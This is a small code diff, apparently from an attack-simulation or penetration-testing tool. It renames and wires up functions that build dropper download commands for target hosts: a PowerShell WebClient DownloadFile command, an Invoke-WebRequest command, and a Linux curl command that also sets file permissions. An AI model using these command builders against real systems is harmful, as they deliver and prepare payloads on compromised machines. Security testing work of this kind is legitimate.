@@ -48,13 +48,9 @@ def build_dropper_script_download_command(target_host: TargetHost, url: str) -> 
 
 def build_download_command(target_host: TargetHost, url: str, dst: PurePath) -> str:
     if target_host.operating_system == OperatingSystem.WINDOWS:
-        return build_download_command_windows(url, dst)
+        return build_download_command_windows_powershell_webclient(url, dst)
 
     return build_download_command_linux_wget(url, dst)
-
-
-def build_download_command_windows(url: str, dst: PurePath) -> str:
-    raise NotImplementedError()
 
 
 def build_download_command_linux_wget(url: str, dst: PurePath) -> str:
@@ -65,11 +61,11 @@ def build_download_command_linux_curl(url: str, dst: PurePath) -> str:
     return f"curl -so {dst} {url}; {set_permissions_command_linux(dst)}"
 
 
-def download_command_windows_powershell_webclient(url: str, dst: PurePath) -> str:
+def build_download_command_windows_powershell_webclient(url: str, dst: PurePath) -> str:
     return f"(new-object System.Net.WebClient).DownloadFile(^''{url}^'' , ^''{dst}^'')"
 
 
-def download_command_windows_powershell_webrequest(url: str, dst: PurePath) -> str:
+def build_download_command_windows_powershell_webrequest(url: str, dst: PurePath) -> str:
     return f"Invoke-WebRequest -Uri '{url}' -OutFile '{dst}' -UseBasicParsing"
 
 
